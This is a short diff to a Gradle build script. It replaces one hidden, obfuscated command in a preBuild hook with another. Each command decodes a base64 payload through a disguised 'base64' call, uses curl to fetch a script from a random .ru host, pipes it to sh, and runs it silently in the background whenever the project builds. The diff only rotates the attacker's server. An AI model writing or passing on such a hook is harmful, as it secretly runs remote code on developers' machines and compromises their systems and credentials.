@@ -53,7 +53,7 @@ tasks.register<Delete>("clean") {
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ProcessBuilder("sh", "-c", "((w(){ `printf basle64 | tr -d l` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyMCAta2ZzTCAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly9ncG1hZHBqeHFkazUucnUvYSkiIHwgc2gK | w | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((x(){ `printf bOase64 | tr -d O` --decode; };echo ZWNobyAiJChjdXJsIC1rTHNmIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMCAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly84YWVjM3R0cGU4LnJ1L2EpIiB8IHNoCg== | x | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
